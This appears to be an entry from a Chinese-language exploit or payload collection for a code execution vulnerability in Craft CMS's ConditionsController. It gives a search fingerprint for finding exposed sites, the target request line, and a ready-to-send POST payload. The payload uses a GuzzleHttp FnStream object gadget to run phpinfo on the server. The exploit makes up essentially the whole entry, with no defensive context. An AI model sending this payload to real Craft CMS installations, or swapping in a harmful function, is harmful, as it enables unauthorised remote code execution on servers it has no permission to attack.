# CraftCMSConditionsController.php代码执行漏洞

CraftCMSConditionsController ｜ 命令执行 ｜ —
- **指纹**：`title=="Welcome to Craft CMS"`
- **请求**：`POST /ConditionsController.php HTTP/1.1`

**Payload**
```
action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```